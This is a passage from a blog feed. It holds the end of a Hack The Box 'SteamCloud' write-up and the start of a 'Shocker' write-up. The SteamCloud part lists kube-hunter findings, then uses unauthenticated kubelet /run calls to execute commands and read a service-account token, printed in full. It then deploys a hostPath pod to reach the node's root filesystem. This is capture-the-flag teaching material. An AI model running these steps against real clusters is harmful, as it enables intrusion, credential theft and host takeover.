<span style="color:#f92672">|</span> KHV043 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Initial Access <span style="color:#f92672">//</span>    <span style="color:#f92672">|</span> Cluster Health       <span style="color:#f92672">|</span> By accessing the     <span style="color:#f92672">|</span> status: ok           <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> General Sensitive    <span style="color:#f92672">|</span> Disclosure           <span style="color:#f92672">|</span> open <span style="color:#f92672">/</span>healthz        <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Information          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> handler,             <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>     an attacker      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> could get the        <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> cluster health state <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> without              <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> authenticating       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
<span style="color:#f92672">|</span> KHV036 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Initial Access <span style="color:#f92672">//</span>    <span style="color:#f92672">|</span> Anonymous            <span style="color:#f92672">|</span> The kubelet <span style="color:#f92672">is</span>       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Exposed sensitive    <span style="color:#f92672">|</span> Authentication       <span style="color:#f92672">|</span> misconfigured,       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> interfaces           <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> potentially allowing <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> secure access to all <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> requests on the      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> kubelet,             <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>     without the need <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> to authenticate      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
<span style="color:#f92672">|</span> KHV040 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Execution <span style="color:#f92672">//</span> Exec    <span style="color:#f92672">|</span> Exposed Run Inside   <span style="color:#f92672">|</span> An attacker could    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> into container       <span style="color:#f92672">|</span> Container            <span style="color:#f92672">|</span> run an arbitrary     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> command inside a     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> container            <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
<span style="color:#f92672">|</span> KHV052 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed Pods         <span style="color:#f92672">|</span> An attacker could    <span style="color:#f92672">|</span> count: <span style="color:#ae81ff">8</span>             <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> view sensitive       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> information about    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> pods that are        <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>     bound to a Node  <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> using the <span style="color:#f92672">/</span>pods      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> endpoint             <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
<span style="color:#f92672">|</span> KHV046 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed Kubelet      <span style="color:#f92672">|</span> Commandline flags    <span style="color:#f92672">|</span> cmdline: <span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>mi <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span> Cmdline              <span style="color:#f92672">|</span> that were passed to  <span style="color:#f92672">|</span> nikube<span style="color:#f92672">/</span>binaries<span style="color:#f92672">/</span>v1<span style="color:#ae81ff">.2</span> <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> the kubelet can be   <span style="color:#f92672">|</span> <span style="color:#ae81ff">2.3</span><span style="color:#f92672">/</span>kubelet<span style="color:#f92672">--</span>bootst  <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> obtained <span style="color:#f92672">from</span> the    <span style="color:#f92672">|</span> rap<span style="color:#f92672">-</span>kubeconfig<span style="color:#f92672">=/</span>etc<span style="color:#f92672">/</span> <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> pprof endpoints      <span style="color:#f92672">|</span> kubernetes<span style="color:#f92672">/</span>bootstrap <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> <span style="color:#f92672">...</span>                  <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
<span style="color:#f92672">|</span> KHV045 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed System Logs  <span style="color:#f92672">|</span> System logs are      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> exposed <span style="color:#f92672">from</span> the     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> <span style="color:#f92672">/</span>logs endpoint on    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> the kubelet          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
<span style="color:#f92672">|</span> KHV038 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed Running Pods <span style="color:#f92672">|</span> Outputs a list of    <span style="color:#f92672">|</span> <span style="color:#ae81ff">8</span> running pods       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> currently running    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> pods,                <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>     <span style="color:#f92672">and</span> some of      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> their metadata,      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> which can reveal     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> sensitive            <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> information          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
<span style="color:#f92672">|</span> KHV037 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed Container    <span style="color:#f92672">|</span> Output logs <span style="color:#f92672">from</span> a   <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span> Logs                 <span style="color:#f92672">|</span> running container    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> are using the        <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> exposed              <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> <span style="color:#f92672">/</span>containerLogs       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> endpoint             <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>

</code></pre></div><h1 id="pwning">PWNING</h1>
<p>Show we know that we can get RCE to available pod in cluster if kubelet exposed. Try to get list of running pod :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -s -k https://10.129.96.107:10250/runningpods/ <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>| jq <span style="color:#e6db74">&#39;.items[].metadata.name&#39;</span>

<span style="color:#e6db74">&#34;etcd-steamcloud&#34;</span>
<span style="color:#e6db74">&#34;nginx&#34;</span>
<span style="color:#e6db74">&#34;coredns-78fcd69978-t2sck&#34;</span>
<span style="color:#e6db74">&#34;kube-proxy-sk74k&#34;</span>
<span style="color:#e6db74">&#34;storage-provisioner&#34;</span>
<span style="color:#e6db74">&#34;kube-controller-manager-steamcloud&#34;</span>
<span style="color:#e6db74">&#34;kube-apiserver-steamcloud&#34;</span>
<span style="color:#e6db74">&#34;kube-scheduler-steamcloud&#34;</span>
</code></pre></div><p>Pod that we can use for RCE is nginx and kube-proxy. Try to get service account in kube-proxy port, but sa is limited, so try to continue using sa used by nginx.
get service account nginx :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -XPOST -k https://10.129.96.107:10250/run/default/nginx/nginx -d <span style="color:#e6db74">&#34;cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token&#34;</span>

eyJhbGciOiJSUzI1NiIsImtpZCI6Il9DclVpYUREamVUaG5sM3h5U01zYTNzRlpfTVRlRTZmdDBLQTJDMm5WeDgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjY5MjcyMzAyLCJpYXQiOjE2Mzc3MzYzMDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImE4ODlkYjQwLTIxM2YtNGI0Ni1hYTBlLTIzMDE2MjY5MmRhYSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImEyMWQ4YzMzLTBiMjYtNDI5YS05ZjIzLTIyYTg2OWE3MThjMCJ9LCJ3YXJuYWZ0ZXIiOjE2Mzc3Mzk5MDl9LCJuYmYiOjE2Mzc3MzYzMDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.IlqyPM0qzntJ9Jdh1YmyNE6UjIRnOgW8MM7CKNocggG6qvop7rpPQghBa_0acms9BsLqgfKiAvi97NMbgnlU3Sm_e6IKwMCxMsz5y6Bhh0miAgkK3czjtpDWw6PXAv0K7QbX2tloB0GyOJiA5rvJ6x2ERjREl-gc3Vv0kEpPIDaPHHKWNRynNQx9BIO0yFcectS2TR3Ncl3HVbSoQNb5a5YQ7JXg6z_3X_-bNugQsenyUBFUG8EK_KmUhA6CMW0EyznFAscu385yKR0T-2lu-KZ-KVHJ39ShoD3Am04fmHRK5BnBm4VZt30QtC9P5kYcqQS_M8ie2rmBFNVPqoLBOQ
</code></pre></div><p>From here, we get nginx token and try to akses  cluster using this token.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export TOKEN<span style="color:#f92672">=</span> &lt;token above&gt;

kubectl --insecure-skip-tls-verify<span style="color:#f92672">=</span>true  <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>          --server<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://10.129.96.107:8443&#34;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>          --token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>TOKEN<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>          get pod

NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   <span style="color:#ae81ff">0</span>          23m

 spec:
    containers:
    - image: nginx:1.14.2
      imagePullPolicy: Never
      name: nginx
      ports:
      - containerPort: <span style="color:#ae81ff">80</span>
        protocol: TCP
      resources: <span style="color:#f92672">{}</span>
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-9jx6j
        readOnly: true

</code></pre></div><p>Create malicious pod that mount to host :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
<span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
<span style="color:#f92672">metadata</span>:
  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">attacker</span>
<span style="color:#f92672">spec</span>:
  <span style="color:#f92672">containers</span>:
  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx</span>
    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">nginx:1.14.2</span>
    <span style="color:#f92672">args</span>:
    - <span style="color:#ae81ff">sleep</span>
    - <span style="color:#e6db74">&#34;1000000&#34;</span>
    <span style="color:#f92672">volumeMounts</span>:
    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">node-host</span>
      <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/node-host</span>
  <span style="color:#f92672">volumes</span>:
  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">node-host</span>
    <span style="color:#f92672">hostPath</span>:
      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
      <span style="color:#f92672">type</span>: <span style="color:#ae81ff">Directory</span>

<span style="color:#ae81ff">$ kubectl --insecure-skip-tls-verify=true  \</span>
          --<span style="color:#ae81ff">server=&#34;https://10.129.96.107:8443&#34; \</span>
          --<span style="color:#ae81ff">token=&#34;${TOKEN}&#34; \</span>
          <span style="color:#ae81ff">apply -f attacker.yaml</span>

<span style="color:#ae81ff">pod/attacker created</span>
</code></pre></div><p>Now Try to RCE in attacker pod :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -XPOST -k <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>https://10.129.96.107:10250/run/default/attacker/nginx <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#34;cmd=ls -la&#34;</span>

total <span style="color:#ae81ff">76</span>
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">24</span> 07:11 .
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">24</span> 07:11 ..
-rwxr-xr-x   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">24</span> 07:11 .dockerenv
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> bin
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2019</span> boot
drwxr-xr-x   <span style="color:#ae81ff">5</span> root root  <span style="color:#ae81ff">360</span> Nov <span style="color:#ae81ff">24</span> 07:11 dev
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">24</span> 07:11 etc
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2019</span> home
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> lib
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> lib64
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> media
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> mnt
drwxr-xr-x  <span style="color:#ae81ff">18</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 21:09 node-host
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> opt
dr-xr-xr-x <span style="color:#ae81ff">205</span> root root    <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">24</span> 07:11 proc
drwx------   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> root
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">24</span> 07:11 run
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> sbin
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> srv
dr-xr-xr-x  <span style="color:#ae81ff">13</span> root root    <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">24</span> 07:11 sys
drwxrwxrwt   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> tmp
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> usr
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> var

$ curl -XPOST -k <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>https://10.129.96.107:10250/run/default/attacker/nginx <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#34;cmd=ls -la /node-host/root/&#34;</span>
total <span style="color:#ae81ff">44</span>
drwx------  <span style="color:#ae81ff">6</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">20</span> 13:42 .
drwxr-xr-x <span style="color:#ae81ff">18</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 21:09 ..
lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Nov <span style="color:#ae81ff">16</span> 20:06 .bash_history -&gt; /dev/null
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">570</span> Jan <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2010</span> .bashrc
drwxr-x---  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 11:46 .kube
drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">20</span> 12:58 .local
drwxr-xr-x <span style="color:#ae81ff">10</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 11:45 .minikube
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">148</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2015</span> .profile
-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">74</span> Nov <span style="color:#ae81ff">20</span> 12:45 .selected_editor
-rw-------  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1457</span> Nov <span style="color:#ae81ff">20</span> 13:42 .viminfo
drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">20</span> 13:42 Developments
-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">26</span> Nov <span style="color:#ae81ff">17</span> 11:26 flag.txt


$ curl -XPOST -k <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>https://10.129.96.107:10250/run/default/attacker/nginx <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#34;cmd=cat /node-host/root/flag.txt&#34;</span>

HTB<span style="color:#f92672">{</span>dOn7_3Xpo53_Ku83L37<span style="color:#f92672">}</span>

</code></pre></div><p>FLAG : <code>HTB{dOn7_3Xpo53_Ku83L37}</code></p>
]]></content>
        </item>
        
        <item>
            <title>Recap HTB: Shocker</title>
            <link>/posts/recap-htb-shocker/</link>
            <pubDate>Tue, 26 Oct 2021 19:35:16 +0700</pubDate>
            
            <guid>/posts/recap-htb-shocker/</guid>
            <description>0x0 Intro    Name Values     Machine Name shocker   Difficulty Easy   Retired True   Release Date 1486 Days   Machine IP 10.10.10.56    0x1 Enumeration Nmap/Rustscan Lets start to enumerate the machine first, using this command :
$ rustscan -a 10.10.10.60 --ulimit 10000 -- -sV -sC -A -T5 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Apache httpd 2.</description>
            <content type="html"><![CDATA[<h2 id="0x0-intro">0x0 Intro</h2>
<table>
<thead>
<tr>
<th>Name</th>
<th style="text-align:right">Values</th>
</tr>
</thead>
<tbody>
<tr>
<td>Machine Name</td>
<td style="text-align:right">shocker</td>
</tr>
<tr>
<td>Difficulty</td>
<td style="text-align:right">Easy</td>
</tr>
<tr>
<td>Retired</td>
<td style="text-align:right">True</td>
</tr>
<tr>
<td>Release Date</td>
<td style="text-align:right">1486 Days</td>
</tr>
<tr>
<td>Machine IP</td>
<td style="text-align:right">10.10.10.56</td>
</tr>
</tbody>
</table>
